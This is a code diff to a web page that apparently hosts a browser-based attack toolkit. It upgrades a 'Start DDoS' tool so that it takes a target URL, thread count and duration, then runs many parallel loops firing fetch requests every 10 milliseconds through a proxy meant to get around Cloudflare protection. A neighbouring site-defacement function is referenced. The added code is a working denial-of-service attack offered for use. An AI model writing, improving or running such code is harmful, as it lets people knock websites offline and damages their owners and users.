@@ -133,6 +133,8 @@ async function defaceSite() {
 **Usage:**
 
 <textarea id="ddos-url" placeholder="Target URL"></textarea><br>
+<textarea id="ddos-threads" placeholder="Number of threads (default: 100)"></textarea><br>
+<textarea id="ddos-time" placeholder="Duration in seconds (default: 60)"></textarea><br>
 <button onclick="startDDoS()">Start DDoS</button>
 <button onclick="stopDDoS()">Stop DDoS</button>
 <div id="ddos-timer">Timer: 0</div>
@@ -142,53 +144,77 @@ let ddosInterval;
 let ddosSeconds = 0;
 let isDDoSRunning = false;
 let controller = null;
+let attackThreads = []; // Store threads for management
 
 async function startDDoS() {
  if (isDDoSRunning) return;
  isDDoSRunning = true;
+
  let url = document.getElementById('ddos-url').value;
- console.log("Starting DDoS attack on:", url);
+ let threads = parseInt(document.getElementById('ddos-threads').value) || 100;
+ let duration = parseInt(document.getElementById('ddos-time').value) || 60;
+
+ console.log(`Starting DDoS attack on: ${url} with ${threads} threads for ${duration} seconds`);
 
  ddosInterval = setInterval(updateDDOSTimer, 1000);
 
  controller = new AbortController();
  const signal = controller.signal;
 
- // Implement the actual DDoS logic
- while (isDDoSRunning) {
+ // Prepare the attack threads
+ for (let i = 0; i < threads; i++) {
+  attackThreads.push(ddosAttackThread(url, signal));
+ }
+
+ // Execute the attack threads in parallel
+ Promise.all(attackThreads).then(() => {
+  if (isDDoSRunning) {
+  console.log('DDoS attack completed naturally.');
+  stopDDoS();
+  }
+ }).catch(error => {
+  if (error.name !== 'AbortError') {
+  console.error('DDoS attack terminated due to error:', error);
+  stopDDoS();
+  }
+ });
+
+ // Set timeout for the DDoS attack
+ setTimeout(() => {
+  if (isDDoSRunning) {
+  stopDDoS();
+  console.log('DDoS attack stopped after specified duration.');
+  }
+ }, duration * 1000);
+}
+
+async function ddosAttackThread(url, signal) {
+  while (isDDoSRunning && !signal.aborted) {
   try {
-  // Use a CORS proxy to bypass Cloudflare
   const proxyUrl = 'https://fuckcloudflare.tk/?' + encodeURIComponent(url);
-  
-  // Send multiple requests in parallel
-  for (let i = 0; i < 10; i++) { // Adjust the number of parallel requests as needed
-  fetch(proxyUrl, {
-  mode: 'no-cors', // Bypass CORS (Note: This might not always work)
-  signal: signal  // Add AbortSignal
-  })
-  .then(response => {
-  console.log("DDoS attack sent to:", url);
-  })
-  .catch(error => {
-  if (error.name === 'AbortError') {
-  console.log('DDoS attack aborted.');
-  } else {
-  console.error("DDoS attack failed:", error);
-  }
+
+  // Use fetch with AbortSignal
+  const response = await fetch(proxyUrl, {
+  mode: 'no-cors',
+  signal: signal,
   });
+
+  if (response.ok) {
+  console.log("DDoS attack sent to:", url);
+  } else {
+  console.error("DDoS attack failed (thread):", response.status);
   }
-  
-  // If the request fails, it will throw an error and be caught
   } catch (error) {
   if (error.name === 'AbortError') {
-  console.log('DDoS attack aborted.');
+  console.log('DDoS attack thread aborted.');
   } else {
-  console.error("DDoS attack failed:", error);
+  console.error("DDoS attack failed (thread):", error);
   }
   }
+
   // Short delay to prevent excessive CPU usage
-  await new Promise(resolve => setTimeout(resolve, 100));
- }
+  await new Promise(resolve => setTimeout(resolve, 10));
+  }
 }
 
 function stopDDoS() {
@@ -201,6 +227,7 @@ function stopDDoS() {
   controller.abort(); // Abort all ongoing fetch requests
   controller = null;
  }
+ attackThreads = []; // Clear attack threads
 }
 
 function updateDDOSTimer() {
